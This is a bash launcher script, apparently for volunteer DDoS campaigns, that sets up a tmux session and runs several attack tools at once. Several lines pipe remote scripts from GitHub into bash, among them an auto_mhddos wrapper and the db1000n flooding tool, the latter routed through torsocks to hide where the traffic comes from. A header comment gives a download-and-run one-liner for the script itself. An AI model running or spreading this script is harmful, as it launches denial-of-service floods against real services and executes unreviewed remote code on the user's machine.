#!/bin/bash
# curl -s https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh -o md2.sh && bash md2.sh
sudo apt-get update -y
sudo apt-get install -y tmux wget torsocks vnstat fish python3 python3-pip gcc libc-dev libffi-dev libssl-dev python3-dev rustc
pip install --upgrade pip
#install docker
#sudo apt install apt-transport-https ca-certificates curl software-properties-common
#curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
#sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable"
#sudo apt install docker-ce -y

#tmux mouse support
grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
tmux source-file ~/.tmux.conf

tmux kill-session -t multiddos; sudo pkill node
cd ~
rm -rf multiddos
mkdir multiddos
cd multiddos

if [ ! -f "/usr/local/bin/gotop" ]; then
    wget https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb
    sudo dpkg -i gotop_3.0.0_linux_amd64.deb
fi

tmux new-session -s multiddos -d 'gotop -asc solarized'
sleep 0.1
tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh | bash'
sleep 0.1
tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
#tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
tmux select-pane -t 0
sleep 0.1
tmux split-window -v 'vnstat -l'
tmux -2 attach-session -d
